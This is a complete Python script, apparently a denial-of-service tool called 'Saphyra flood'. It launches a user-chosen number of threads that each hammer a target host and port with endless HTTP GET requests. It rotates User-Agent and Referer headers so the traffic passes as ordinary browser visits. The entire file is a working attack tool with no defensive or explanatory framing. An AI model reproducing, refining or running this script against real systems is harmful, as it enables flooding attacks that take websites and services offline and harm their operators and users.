
#!/usr/bin/env python3
import sys
import random
import threading
import requests

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <host> <port> <threads>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    threads = int(sys.argv[3])

    url = f"http://{host}:{port}/"
    print(f"Starting Saphyra flood against {url} with {threads} threads")

    for _ in range(threads):
        t = threading.Thread(target=flood, args=(url,))
        t.daemon = True
        t.start()

    while True:
        pass

def flood(url):
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': random.choice(REFERERS)
    }
    while True:
        try:
            r = requests.get(url, headers=headers, timeout=5)
            print(f"Flooded: {url} | {r.status_code}")
        except Exception as ex:
            print(f"Error sending request: {ex}")

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (Linux; Android 10)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'
]

REFERERS = [
    'http://google.com/?q=',
    'http://bing.com/search?q=',
    'http://duckduckgo.com/?q=',
    'http://yahoo.com/search?p='
]

if __name__ == "__main__":
    main()
